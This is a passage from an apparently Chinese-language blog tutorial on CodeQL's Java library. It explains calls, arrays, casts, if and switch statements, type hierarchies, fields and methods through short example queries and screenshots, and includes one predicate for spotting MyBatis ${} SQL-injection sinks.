id="0x02-17-getAnAnnotation"><a href="#0x02-17-getAnAnnotation" class="headerlink" title="0x02-17 getAnAnnotation"></a>0x02-17 getAnAnnotation</h3><h6 id="获取匹配到元素的注解"><a href="#获取匹配到元素的注解" class="headerlink" title="获取匹配到元素的注解"></a>获取匹配到元素的注解</h6><pre><code>class SpringControllerAnnotation2 extends AnnotationType {    SpringControllerAnnotation2() {      // `@Controller` used directly as an annotation.      this.hasQualifiedName(&quot;org.springframework.stereotype&quot;, &quot;Controller&quot;)      or      // `@Controller` can be used as a meta-annotation on other annotation types.      this.getAnAnnotation().getType() instanceof SpringControllerAnnotation2    }}</code></pre><p>this.getAnAnnotation().getType() 获取注解，例如@RestController</p><p><img src="/img/CodeQLBase/image-20220607200652946.png" alt="image-20220607200652946"></p><p>this.hasQualifiedName(“org.springframework.stereotype”, “Controller”) 注解其实本质是接口，所在的包是在org.springframework.stereotype.Controller</p><p><img src="/img/CodeQLBase/image-20220607200503054.png" alt="image-20220607200503054"></p><p>所以就能够找到注解@Controller了</p><h2 id="0x03-Call和Callable"><a href="#0x03-Call和Callable" class="headerlink" title="0x03 Call和Callable"></a>0x03 Call和Callable</h2><h3 id="0x03-1-Call-getCaller和Call-getCallee"><a href="#0x03-1-Call-getCaller和Call-getCallee" class="headerlink" title="0x03-1 Call.getCaller和Call.getCallee"></a>0x03-1 Call.getCaller和Call.getCallee</h3><h6 id="Call表示调用Callable的这个过程（方法调用，构造器调用等等），Callable表示可调用的方法或构造器的集合。"><a href="#Call表示调用Callable的这个过程（方法调用，构造器调用等等），Callable表示可调用的方法或构造器的集合。" class="headerlink" title="Call表示调用Callable的这个过程（方法调用，构造器调用等等），Callable表示可调用的方法或构造器的集合。"></a>Call表示调用Callable的这个过程（方法调用，构造器调用等等），Callable表示可调用的方法或构造器的集合。</h6><p>Call类提供两个谓词函数来获取调用方和被调用方。getCaller()与getCallee()。</p><p>getCaller  调用方，例如下面例子的getRequestDatas</p><p>getCallee 被调用方，例如下面例子的parseObject </p><p>Callable 表示可调用的方法或构造器的集合，例如下面例子的parseObject</p><p>Call 表示过程，例如下面例子的JSONObject.parseObject(result)</p><p>Callable  等价于 call.getCallee()</p><pre><code>import semmle.code.java.frameworks.spring.SpringControllerfrom Call call, Callable parseExpressionwhere    call.getCallee() = parseExpression and    parseExpression.getDeclaringType().hasQualifiedName(&quot;com.alibaba.fastjson&quot;, &quot;JSON&quot;) and    parseExpression.hasName(&quot;parseObject&quot;)select call, parseExpression, call.getCallee(), call.getCaller()</code></pre><p><img src="/img/CodeQLBase/image-20220607201214967.png" alt="image-20220607201214967"></p><h3 id="0x03-2-Call-getAnArgument"><a href="#0x03-2-Call-getAnArgument" class="headerlink" title="0x03-2 Call.getAnArgument"></a>0x03-2 Call.getAnArgument</h3><h6 id="获取所有的参数"><a href="#获取所有的参数" class="headerlink" title="获取所有的参数"></a>获取所有的参数</h6><pre><code>import semmle.code.java.frameworks.spring.SpringControllerfrom Call call, Callable parseExpressionwhere    call.getCallee() = parseExpression and    parseExpression.getDeclaringType().hasQualifiedName(&quot;com.alibaba.fastjson&quot;, &quot;JSON&quot;) and    parseExpression.hasName(&quot;parseObject&quot;)select call.getAnArgument()</code></pre><p><img src="/img/CodeQLBase/image-20220607201433001.png" alt="image-20220607201433001"></p><h3 id="0x03-3-Call-getArgument"><a href="#0x03-3-Call-getArgument" class="headerlink" title="0x03-3 Call.getArgument"></a>0x03-3 Call.getArgument</h3><h6 id="getArgument-0-获取第一个参数"><a href="#getArgument-0-获取第一个参数" class="headerlink" title="getArgument(0) 获取第一个参数"></a>getArgument(0) 获取第一个参数</h6><h6 id="getArgument-1-获取第二个参数"><a href="#getArgument-1-获取第二个参数" class="headerlink" title="getArgument(1) 获取第二个参数"></a>getArgument(1) 获取第二个参数</h6><pre><code>import semmle.code.java.frameworks.spring.SpringControllerfrom Call call, Callable parseExpressionwhere    call.getCallee() = parseExpression and    parseExpression.getDeclaringType().hasQualifiedName(&quot;com.alibaba.fastjson&quot;, &quot;JSON&quot;) and    parseExpression.hasName(&quot;parseObject&quot;)select call.getArgument(0)</code></pre><p><img src="/img/CodeQLBase/image-20220607201546950.png" alt="image-20220607201546950"></p><h3 id="0x03-4-Call-getNumArgument"><a href="#0x03-4-Call-getNumArgument" class="headerlink" title="0x03-4 Call.getNumArgument"></a>0x03-4 Call.getNumArgument</h3><h6 id="参数个数"><a href="#参数个数" class="headerlink" title="参数个数"></a>参数个数</h6><pre><code>import semmle.code.java.frameworks.spring.SpringControllerfrom Call call, Callable parseExpressionwhere    call.getCallee() = parseExpression and    parseExpression.getDeclaringType().hasQualifiedName(&quot;com.alibaba.fastjson&quot;, &quot;JSON&quot;) and    parseExpression.hasName(&quot;parseObject&quot;)select call, call.getNumArgument()</code></pre><p><img src="/img/CodeQLBase/image-20220607201711239.png" alt="image-20220607201711239"></p><h3 id="0x03-5-callable-getSignature"><a href="#0x03-5-callable-getSignature" class="headerlink" title="0x03-5 callable.getSignature()"></a>0x03-5 callable.getSignature()</h3><h6 id="获取参数类型"><a href="#获取参数类型" class="headerlink" title="获取参数类型"></a>获取参数类型</h6><pre><code>from Call call, Callable callablewhere    call.getCallee() = callable and     callable = getRelatedMethods(&quot;javax.imageio&quot;, &quot;ImageIO&quot;, &quot;read&quot;)select call, callable.getSignature()</code></pre><p><img src="/img/CodeQLBase/image-20220218151557072.png" alt="image-20220218151557072"></p><h2 id="0x04-数组"><a href="#0x04-数组" class="headerlink" title="0x04 数组"></a>0x04 数组</h2><h3 id="0x04-1-ArrayCreationExpr"><a href="#0x04-1-ArrayCreationExpr" class="headerlink" title="0x04-1 ArrayCreationExpr"></a>0x04-1 ArrayCreationExpr</h3><h6 id="匹配数组"><a href="#匹配数组" class="headerlink" title="匹配数组"></a>匹配数组</h6><pre><code>import javafrom ArrayCreationExpr ace select ace, ace.getFile(), ace.getLocation()</code></pre><p><img src="/img/CodeQLBase/image-20220107152711004.png" alt="image-20220107152711004"></p><p><img src="/img/CodeQLBase/image-20220107152736869.png" alt="image-20220107152736869"></p><h3 id="0x04-2-getAChildExpr"><a href="#0x04-2-getAChildExpr" class="headerlink" title="0x04-2 getAChildExpr"></a>0x04-2 getAChildExpr</h3><h6 id="返回数组类型"><a href="#返回数组类型" class="headerlink" title="返回数组类型"></a>返回数组类型</h6><pre><code>import javafrom ArrayCreationExpr ace select ace, ace.getAChildExpr(), ace.getFile(), ace.getLocation()</code></pre><p><img src="/img/CodeQLBase/image-20220107152811970.png" alt="image-20220107152811970"></p><h3 id="0x04-3-getParent"><a href="#0x04-3-getParent" class="headerlink" title="0x04-3 getParent"></a>0x04-3 getParent</h3><h6 id="返回赋值的变量"><a href="#返回赋值的变量" class="headerlink" title="返回赋值的变量"></a>返回赋值的变量</h6><pre><code>import javafrom ArrayCreationExpr acewhere ace.getAChildExpr().getType().hasName(&quot;String&quot;)select ace, ace.getParent()</code></pre><p><img src="/img/CodeQLBase/image-20220107162520138.png" alt="image-20220107162520138"></p><h3 id="0x04-4-限定字符数组"><a href="#0x04-4-限定字符数组" class="headerlink" title="0x04-4 限定字符数组"></a>0x04-4 限定字符数组</h3><pre><code>import javafrom ArrayCreationExpr ace where ace.getAChildExpr().getType().hasName(&quot;String&quot;)select ace, ace.getAChildExpr(), ace.getFile(), ace.getLocation()</code></pre><p><img src="/img/CodeQLBase/image-20220107153325644.png" alt="image-20220107153325644"></p><h3 id="0x04-5-ArrayInit"><a href="#0x04-5-ArrayInit" class="headerlink" title="0x04-5 ArrayInit"></a>0x04-5 ArrayInit</h3><h6 id="获取数组的一些值"><a href="#获取数组的一些值" class="headerlink" title="获取数组的一些值"></a>获取数组的一些值</h6><p>由ArrayCreationExpr.getInit()返回</p><p><img src="/img/CodeQLBase/image-20220107155004342.png" alt="image-20220107155004342"></p><h3 id="0x04-6-getInit-index"><a href="#0x04-6-getInit-index" class="headerlink" title="0x04-6 getInit(index)"></a>0x04-6 getInit(index)</h3><h6 id="获取数组里下标为x的值"><a href="#获取数组里下标为x的值" class="headerlink" title="获取数组里下标为x的值"></a>获取数组里下标为x的值</h6><pre><code>import javafrom ArrayCreationExpr acewhere ace.getAChildExpr().getType().hasName(&quot;String&quot;)select ace, ace.getInit().getInit(2)</code></pre><p><img src="/img/CodeQLBase/image-20220107155034108.png" alt="image-20220107155034108"></p><h3 id="0x04-7-getSize"><a href="#0x04-7-getSize" class="headerlink" title="0x04-7 getSize()"></a>0x04-7 getSize()</h3><h6 id="获取数组的长度"><a href="#获取数组的长度" class="headerlink" title="获取数组的长度"></a>获取数组的长度</h6><p><img src="/img/CodeQLBase/image-20220107155139129.png" alt="image-20220107155139129"></p><h3 id="0x04-8-ArrayAccess"><a href="#0x04-8-ArrayAccess" class="headerlink" title="0x04-8 ArrayAccess"></a>0x04-8 ArrayAccess</h3><p>ArrayAccess 等价于 a[i++]</p><h6 id="个人理解：Array是数组的意思，Access是访问的意思，合起来就是访问数组。那么就是得到数组里的值，所以通过下标来获取数组里的值。因此等价于a-i"><a href="#个人理解：Array是数组的意思，Access是访问的意思，合起来就是访问数组。那么就是得到数组里的值，所以通过下标来获取数组里的值。因此等价于a-i" class="headerlink" title="个人理解：Array是数组的意思，Access是访问的意思，合起来就是访问数组。那么就是得到数组里的值，所以通过下标来获取数组里的值。因此等价于a[i++]"></a>个人理解：Array是数组的意思，Access是访问的意思，合起来就是访问数组。那么就是得到数组里的值，所以通过下标来获取数组里的值。因此等价于a[i++]</h6><p><img src="/img/CodeQLBase/image-20211230210948622.png" alt="image-20211230210948622"></p><p>ArrayAccess.getIndexExpr() 等价于 i++</p><p><img src="/img/CodeQLBase/image-20220607203338965.png" alt="image-20220607203338965"></p><p>UnaryAssignExpr 等价于 ++或者–</p><p><img src="/img/CodeQLBase/image-20211230211336130.png" alt="image-20211230211336130"></p><pre class="line-numbers language-ql"><code class="language-ql">import javafrom ArrayAccess awhere a.getIndexExpr() instanceof UnaryAssignExprselect a, a.getIndexExpr()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/img/CodeQLBase/image-20211230211421777.png" alt="image-20211230211421777"></p><p>ArrayAccess就是ids[i++]</p><p><img src="/img/CodeQLBase/image-20220607203509424.png" alt="image-20220607203509424"></p><h2 id="0x05-强制类型转换"><a href="#0x05-强制类型转换" class="headerlink" title="0x05 强制类型转换"></a>0x05 强制类型转换</h2><h3 id="0x05-1-castexpr"><a href="#0x05-1-castexpr" class="headerlink" title="0x05-1 castexpr"></a>0x05-1 castexpr</h3><h6 id="一个强制类型转换的表达式"><a href="#一个强制类型转换的表达式" class="headerlink" title="一个强制类型转换的表达式"></a>一个强制类型转换的表达式</h6><p><img src="/img/CodeQLBase/image-20220103144051080.png" alt="image-20220103144051080"></p><p>查找从浮点类型到整数类型的强制转换</p><pre><code>import javafrom CastExpr cwhere  c.getExpr().getType() instanceof FloatingPointType and  c.getType() instanceof IntegralTypeselect c, c.getExpr(), c.getType(), c.getExpr().getType()</code></pre><p><img src="/img/CodeQLBase/image-20220607204304755.png" alt="image-20220607204304755"></p><h2 id="0x06-实例化"><a href="#0x06-实例化" class="headerlink" title="0x06 实例化"></a>0x06 实例化</h2><h3 id="0x06-1-ClassInstanceExpr"><a href="#0x06-1-ClassInstanceExpr" class="headerlink" title="0x06-1 ClassInstanceExpr"></a>0x06-1 ClassInstanceExpr</h3><h6 id="类实例化的表达式"><a href="#类实例化的表达式" class="headerlink" title="类实例化的表达式"></a>类实例化的表达式</h6><p><img src="/img/CodeQLBase/image-20211230213106346.png" alt="image-20211230213106346"></p><h3 id="0x06-2-getConstructedType"><a href="#0x06-2-getConstructedType" class="headerlink" title="0x06-2  getConstructedType"></a>0x06-2  getConstructedType</h3><h6 id="构造函数的类型"><a href="#构造函数的类型" class="headerlink" title="构造函数的类型"></a>构造函数的类型</h6><p><img src="/img/CodeQLBase/image-20211230213257615.png" alt="image-20211230213257615"></p><pre><code>import javafrom ClassInstanceExpr newwhere new.getConstructedType().hasQualifiedName(&quot;com.jeecms.auth.domain.vo&quot;, &quot;CoreUserAgent&quot;)select new, new.getConstructedType()</code></pre><p><img src="/img/CodeQLBase/image-20220607210054268.png" alt="image-20220607210054268"></p><h2 id="0x07-if语句"><a href="#0x07-if语句" class="headerlink" title="0x07 if语句"></a>0x07 if语句</h2><h3 id="0x07-1-IfStmt"><a href="#0x07-1-IfStmt" class="headerlink" title="0x07-1 IfStmt"></a>0x07-1 IfStmt</h3><p>IfStmt –&gt; if语句</p><p>getCondition –&gt; if的判断语句</p><p>getThen –&gt; 判断条件为true时执行的代码块</p><p>getElse –&gt; 判断条件为false时执行的代码块</p><p><img src="/img/CodeQLBase/image-20220103145013178.png" alt="image-20220103145013178"></p><pre><code>import javafrom IfStmt iselect i, i.getThen(), i.getCondition(), i.getTrueSuccessor(), i.getElse()</code></pre><p><img src="/img/CodeQLBase/image-20220607210424667.png" alt="image-20220607210424667"></p><pre class="line-numbers language-java"><code class="language-java">predicate <span class="token function">isMybatisAnnotationSqlInjection</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node sink<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">exists</span><span class="token punctuation">(</span>MyBaTisSQLInjectAnnotationMethod m<span class="token punctuation">,</span> MethodAccess ma<span class="token punctuation">,</span> MyBatisSQLInjectAnnotation msa<span class="token punctuation">,</span> string sqlStmt <span class="token operator">|</span>         ma<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> m and         <span class="token keyword">if</span> msa<span class="token punctuation">.</span><span class="token function">getAValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">Array</span>        then             sqlStmt <span class="token operator">=</span> msa<span class="token punctuation">.</span><span class="token function">getAValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAChildExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span>             sqlStmt <span class="token operator">=</span> msa<span class="token punctuation">.</span><span class="token function">getAValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        and        <span class="token function">myBatisSQLInjectValue</span><span class="token punctuation">(</span>sqlStmt<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token string">"${%}"</span><span class="token punctuation">)</span> and         m<span class="token punctuation">.</span><span class="token function">getAnAnnotation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> msa and         ma<span class="token punctuation">.</span><span class="token function">getAnArgument</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> sink<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x08-等于或不等于表达式"><a href="#0x08-等于或不等于表达式" class="headerlink" title="0x08 等于或不等于表达式"></a>0x08 等于或不等于表达式</h2><h3 id="0x08-1-EqualityTest"><a href="#0x08-1-EqualityTest" class="headerlink" title="0x08-1 EqualityTest"></a>0x08-1 EqualityTest</h3><p>EqualityTest –&gt; xxx == yyy 或者 xxx != yyy</p><p>getAnOperand –&gt; ==或者!=两边的表达式</p><p>getLeftOperand –&gt; 左边的表达式</p><p>getRightOperand –&gt; 右边的表达式</p><p><img src="/img/CodeQLBase/image-20220103152806169.png" alt="image-20220103152806169"></p><pre><code>import javafrom EqualityTest eq// where eq.getAnOperand() instanceof BooleanLiteralselect eq, eq.getAnOperand(), eq.getLeftOperand(), eq.getRightOperand()</code></pre><p><img src="/img/CodeQLBase/image-20220607210701729.png" alt="image-20220607210701729"></p><h2 id="0x09-继承类、接口类"><a href="#0x09-继承类、接口类" class="headerlink" title="0x09 继承类、接口类"></a>0x09 继承类、接口类</h2><h3 id="0x09-1-RefType"><a href="#0x09-1-RefType" class="headerlink" title="0x09-1 RefType"></a>0x09-1 RefType</h3><h6 id="适用于各种参考类型的通用父类，包括类、接口、类型参数和数组。"><a href="#适用于各种参考类型的通用父类，包括类、接口、类型参数和数组。" class="headerlink" title="适用于各种参考类型的通用父类，包括类、接口、类型参数和数组。"></a>适用于各种参考类型的通用父类，包括类、接口、类型参数和数组。</h6><p><img src="/img/CodeQLBase/image-20211230215613394.png" alt="image-20211230215613394"></p><p>getASupertype+ 获取到父类，并不断往上找父类</p><p><img src="/img/CodeQLBase/image-20211230215727537.png" alt="image-20211230215727537"></p><pre><code>import javafrom RefType typewhere type.getASupertype+().hasQualifiedName(&quot;org.springframework.web.method.support&quot;, &quot;HandlerMethodArgumentResolver&quot;)select type, type.getASupertype()</code></pre><p><img src="/img/CodeQLBase/image-20220607212048143.png" alt="image-20220607212048143"></p><h3 id="0x09-2-匹配出指定类的所有子类"><a href="#0x09-2-匹配出指定类的所有子类" class="headerlink" title="0x09-2 匹配出指定类的所有子类"></a>0x09-2 匹配出指定类的所有子类</h3><p>指定类为LoginSubmitController，是在包com.jeecms.auth.base里定义的</p><pre><code>import javabindingset[packageName, className]RefType getRelatedClasses(string packageName, string className) {  result.hasQualifiedName(packageName, className)  or  // 父类也符合指定的类  result.getASupertype*().hasQualifiedName(packageName, className)  or  result.getASupertype*().hasQualifiedName(packageName, className + &quot;&lt;&gt;&quot;)}from RefType r where r = getRelatedClasses(&quot;com.jeecms.auth.base&quot;, &quot;LoginSubmitController&quot;)select r</code></pre><p>结果里把所有继承于LoginSubmitController的类都匹配出来了</p><p><img src="/img/CodeQLBase/image-20220607213116937.png" alt="image-20220607213116937"></p><h3 id="0x09-3-extendsOrImplements"><a href="#0x09-3-extendsOrImplements" class="headerlink" title="0x09-3 extendsOrImplements"></a>0x09-3 extendsOrImplements</h3><h6 id="获取接口的实现类"><a href="#获取接口的实现类" class="headerlink" title="获取接口的实现类"></a>获取接口的实现类</h6><p>type2类实现了type类</p><pre><code>from RefType type, RefType type2where     type.hasName(&quot;BrandTuanActivityQueryService&quot;) and    type2.extendsOrImplements(type)select type2, type2.getASupertype()</code></pre><p><img src="/img/CodeQLBase/image-20220607213640895.png" alt="image-20220607213640895"></p><h2 id="0x10-类变量"><a href="#0x10-类变量" class="headerlink" title="0x10 类变量"></a>0x10 类变量</h2><h3 id="0x10-1-FieldRead"><a href="#0x10-1-FieldRead" class="headerlink" title="0x10-1 FieldRead"></a>0x10-1 FieldRead</h3><h6 id="类变量被调用"><a href="#类变量被调用" class="headerlink" title="类变量被调用"></a>类变量被调用</h6><pre><code>import javafrom Field f, FieldRead readwhere  f.hasName(&quot;cmsOrgService&quot;) and  f.getDeclaringType().hasQualifiedName(&quot;com.jeecms.admin.controller.auth&quot;, &quot;CmsOrgController&quot;) and  f = read.getField()select f, read, f.getName(), f.getDeclaringType(), f.getType()</code></pre><p><img src="/img/CodeQLBase/image-20220607214407704.png" alt="image-20220607214407704"></p><h2 id="0x11-方法"><a href="#0x11-方法" class="headerlink" title="0x11 方法"></a>0x11 方法</h2><h3 id="0x11-1-MethodAccess-和-Method"><a href="#0x11-1-MethodAccess-和-Method" class="headerlink" title="0x11-1 MethodAccess 和 Method"></a>0x11-1 MethodAccess 和 Method</h3><h6 id="MethodAccess-方法调用"><a href="#MethodAccess-方法调用" class="headerlink" title="MethodAccess 方法调用"></a>MethodAccess 方法调用</h6><p><img src="/img/CodeQLBase/image-20220607215030947.png" alt="image-20220607215030947"></p><h6 id="Method-方法的定义"><a href="#Method-方法的定义" class="headerlink" title="Method 方法的定义"></a>Method 方法的定义</h6><p><img src="/img/CodeQLBase/image-20220607215107531.png" alt="image-20220607215107531"></p><pre><code>import javafrom MethodAccess ma, Method methodwhere  ma.getMethod() = method and  method.hasName(&quot;findListByParentId&quot;) and  method.getDeclaringType().hasQualifiedName(&quot;com.jeecms.system.service&quot;, &quot;CmsOrgService&quot;)select ma, method</code></pre><p><img src="/img/CodeQLBase/image-20220607215241217.png" alt="image-20220607215241217"></p><h3 id="0x11-2-Method-isPublic-Method-isPrivate-Method-isProtected-等"><a href="#0x11-2-Method-isPublic-Method-isPrivate-Method-isProtected-等" class="headerlink" title="0x11-2 Method.isPublic() Method.isPrivate() Method.isProtected()等"></a>0x11-2 Method.isPublic() Method.isPrivate() Method.isProtected()等</h3><h6 id="限定匹配到的方法必须是公共函数、私有函数等"><a href="#限定匹配到的方法必须是公共函数、私有函数等" class="headerlink" title="限定匹配到的方法必须是公共函数、私有函数等"></a>限定匹配到的方法必须是公共函数、私有函数等</h6><p><img src="/img/CodeQLBase/image-20220104112800181.png" alt="image-20220104112800181"></p><pre><code>import javafrom Method mwhere m.isProtected()select m, m.getFile(), m.getLocation()</code></pre><p><img src="/img/CodeQLBase/image-20220607215738149.png" alt="image-20220607215738149"></p><h3 id="0x11-3-getNumberOfParameters"><a href="#0x11-3-getNumberOfParameters" class="headerlink" title="0x11-3 getNumberOfParameters"></a>0x11-3 getNumberOfParameters</h3><h6 id="方法的参数个数"><a href="#方法的参数个数" class="headerlink" title="方法的参数个数"></a>方法的参数个数</h6><p>Method.getNumberOfParameters 返回参数的个数</p><pre><code>import javafrom Method mwhere     m.getNumberOfParameters() = 3select m, m.getFile(), m.getLocation()</code></pre><p><img src="/img/CodeQLBase/image-20220607220005886.png" alt="image-20220607220005886"></p><h3 id="0x11-4-getAParameter"><a href="#0x11-4-getAParameter" class="headerlink" title="0x11-4 getAParameter"></a>0x11-4 getAParameter</h3><h6 id="方法的参数"><a href="#方法的参数" class="headerlink" title="方法的参数"></a>方法的参数</h6><p>Method.getAParameter 返回参数</p><pre><code>import javafrom Method mwhere     m.getNumberOfParameters() = 3 and     m.hasName(&quot;updateName&quot;)select m.getAParameter()</code></pre><p><img src="/img/CodeQLBase/image-20220607220152940.png" alt="image-20220607220152940"></p><h3 id="0x11-5-overrides"><a href="#0x11-5-overrides" class="headerlink" title="0x11-5 overrides"></a>0x11-5 overrides</h3><h6 id="覆盖"><a href="#覆盖" class="headerlink" title="覆盖"></a>覆盖</h6><pre><code>import javafrom Method override, Method basewhere  base.hasName(&quot;save&quot;) and  base.getDeclaringType().hasQualifiedName(&quot;com.jeecms.audit.service&quot;, &quot;AuditStrategyService&quot;) and  override.overrides+(base)select override, base, override.getFile(), base.getFile()</code></pre><p>AuditStrategyService接口定义了一个方法save</p><p>AuditStrategyServiceImpl实现类实现了save方法的具体内容</p><p>所以使用了Override注释符</p><p>所以codeql的代码里，override指的是AuditStrategyServiceImpl#save，base是AuditStrategyService#save</p><p>那么override.overrides+(base)就是说AuditStrategyServiceImpl#save覆盖了AuditStrategyService#save</p><p><img src="/img/CodeQLBase/image-20220608113557300.png" alt="image-20220608113557300"></p><h3 id="0x11-6-getAReference"><a href="#0x11-6-getAReference" class="headerlink" title="0x11-6 getAReference"></a>0x11-6 getAReference</h3><h6 id="方法被调用"><a href="#方法被调用" class="headerlink" title="方法被调用"></a>方法被调用</h6><p>Method.getAReference    匹配的方法被调用过</p><pre><code>import java from Method m where     m.isPublic() and     exists(m.getAReference())select m, m.getAReference()</code></pre><p>例如existItem这个方法就被调用了</p><p><img src="/img/CodeQLBase/image-20220608114306467.png" alt="image-20220608114306467"></p><h3 id="0x11-7-getReturnType"><a href="#0x11-7-getReturnType" class="headerlink" title="0x11-7 getReturnType"></a>0x11-7 getReturnType</h3><h6 id="方法的返回类型"><a href="#方法的返回类型" class="headerlink" title="方法的返回类型"></a>方法的返回类型</h6><p>getReturnType</p><pre><code>import javafrom Method mwhere m.getName() = &quot;existItem&quot;select m, m.getReturnType()</code></pre><p>Method.getReturnType 返回方法的返回值类型</p><p><img src="/img/CodeQLBase/image-20220608151232820.png" alt="image-20220608151232820"></p><h3 id="0x11-8-MethodAccess-getQualifier"><a href="#0x11-8-MethodAccess-getQualifier" class="headerlink" title="0x11-8 MethodAccess.getQualifier()"></a>0x11-8 MethodAccess.getQualifier()</h3><h6 id="返回方法调用的类名"><a href="#返回方法调用的类名" class="headerlink" title="返回方法调用的类名"></a>返回方法调用的类名</h6><pre><code>import javafrom MethodAccess ma, Method methodwhere  ma.getMethod() = method and  method.hasName(&quot;save&quot;) and  method.getDeclaringType().hasQualifiedName(&quot;com.jeecms.audit.service&quot;, &quot;AuditStrategyService&quot;)select ma, method, ma.getQualifier()</code></pre><p><img src="/img/CodeQLBase/image-20220608153105195.png" alt="image-20220608153105195"></p><h3 id="0x11-9-匹配add方法"><a href="#0x11-9-匹配add方法" class="headerlink" title="0x11-9 匹配add方法"></a>0x11-9 匹配add方法</h3><pre><code>import javafrom MethodAccess ma, Method methodwhere  ma.getMethod().overrides*(method) and  method.hasName(&quot;add&quot;) and  method.getDeclaringType().getSourceDeclaration().hasQualifiedName(&quot;java.util&quot;, &quot;Collection&quot;)select ma, ma.getMethod(), method,  method.getDeclaringType(), method.getDeclaringType().getSourceDeclaration(), method.getLocation()</code></pre><p>匹配到的add方法是HashSet的内置方法。</p><p>这里要分析下为什么要这么写<code>method.getDeclaringType().getSourceDeclaration().hasQualifiedName(&quot;java.util&quot;, &quot;Collection&quot;)</code></p><p>其实看<code>method.getDeclaringType()和method.getDeclaringType().getSourceDeclaration()</code>的结果也能看出来</p><p><code>method.getDeclaringType()</code>返回了很多Collection的类型，有set，有int，有map等等</p><p>这是因为这些都是接口，继承的是Collection类，所以<code>method.getDeclaringType().getSourceDeclaration()</code>的结果是Collection</p><p><img src="/img/CodeQLBase/image-20220608153328181.png" alt="image-20220608153328181"></p><p>看jdk里面关于set、list等定义</p><p>set</p><p><img src="/img/CodeQLBase/image-20220608162816380.png" alt="image-20220608162816380"></p><p>List</p><p><img src="/img/CodeQLBase/image-20220608162842012.png" alt="image-20220608162842012"></p><h3 id="0x11-10-匹配字符串的append方法"><a href="#0x11-10-匹配字符串的append方法" class="headerlink" title="0x11-10 匹配字符串的append方法"></a>0x11-10 匹配字符串的append方法</h3><pre><code>import javafrom MethodAccess ma, Method methodwhere  ma.getMethod().overrides*(method) and  method.hasName(&quot;append&quot;) and  method.getDeclaringType().getSourceDeclaration().hasQualifiedName(&quot;java.lang&quot;, &quot;StringBuilder&quot;) and  ma.getAnArgument() instanceof StringLiteralselect ma, ma.getMethod(), method,  method.getDeclaringType(), method.getDeclaringType().getSourceDeclaration(), method.getLocation()</code></pre><p><img src="/img/CodeQLBase/image-20220608163406885.png" alt="image-20220608163406885"></p><h2 id="0x12-ReturnStmt"><a href="#0x12-ReturnStmt" class="headerlink" title="0x12 ReturnStmt"></a>0x12 ReturnStmt</h2><h3 id="0x12-1-返回语句"><a href="#0x12-1-返回语句" class="headerlink" title="0x12-1 返回语句"></a>0x12-1 返回语句</h3><p><img src="/img/CodeQLBase/image-20220104154822437.png" alt="image-20220104154822437"></p><pre><code>import javafrom ReturnStmt rwhere r.getResult() instanceof StringLiteralselect r, r.getResult()</code></pre><p>r 的值 return “bean.hasDeleted=true”;</p><p>r.getResult() 的值是返回值 “bean.hasDeleted=true”</p><p><img src="/img/CodeQLBase/image-20220608163529974.png" alt="image-20220608163529974"></p><h2 id="0x13-Switch语句"><a href="#0x13-Switch语句" class="headerlink" title="0x13 Switch语句"></a>0x13 Switch语句</h2><pre><code>import javafrom SwitchStmt switch, EnumType enum, EnumConstant missingwhere  switch.getExpr().getType() = enum and  missing.getDeclaringType() = enum and  not switch.getAConstCase().getValue() = missing.getAnAccess() and  exists(switch.getDefaultCase())select switch, enum, missing, switch.getExpr(), switch.getExpr().getType(), switch.getAConstCase(), missing.getAnAccess(), switch.getDefaultCase()</code></pre><p><img src="/img/CodeQLBase/image-20220608165041111.png" alt="image-20220608165041111"></p><h3 id="0x13-1-SwitchStmt"><a href="#0x13-1-SwitchStmt" class="headerlink" title="0x13-1 SwitchStmt"></a>0x13-1 SwitchStmt</h3><h6 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h6><p><img src="/img/CodeQLBase/image-20220608165143529.png" alt="image-20220608165143529"></p><h3 id="0x13-2-EnumType"><a href="#0x13-2-EnumType" class="headerlink" title="0x13-2 EnumType"></a>0x13-2 EnumType</h3><h6 id="enum类型"><a href="#enum类型" class="headerlink" title="enum类型"></a>enum类型</h6><p><img src="/img/CodeQLBase/image-20220608165208460.png" alt="image-20220608165208460"></p><h3 id="0x13-3-EnumConstant"><a href="#0x13-3-EnumConstant" class="headerlink" title="0x13-3 EnumConstant"></a>0x13-3 EnumConstant</h3><h6 id="enum的常量"><a href="#enum的常量" class="headerlink" title="enum的常量"></a>enum的常量</h6><p><img src="/img/CodeQLBase/image-20220608165908716.png" alt="image-20220608165908716"></p><h3 id="0x13-4-SwitchStmt-getExpr"><a href="#0x13-4-SwitchStmt-getExpr" class="headerlink" title="0x13-4 SwitchStmt.getExpr()"></a>0x13-4 SwitchStmt.getExpr()</h3><h6 id="switch的判断语句"><a href="#switch的判断语句" class="headerlink" title="switch的判断语句"></a>switch的判断语句</h6><p><img src="/img/CodeQLBase/image-20220608165936847.png" alt="image-20220608165936847"></p><h3 id="0x13-5-switch-getAConstCase"><a href="#0x13-5-switch-getAConstCase" class="headerlink" title="0x13-5 switch.getAConstCase()"></a>0x13-5 switch.getAConstCase()</h3><h6 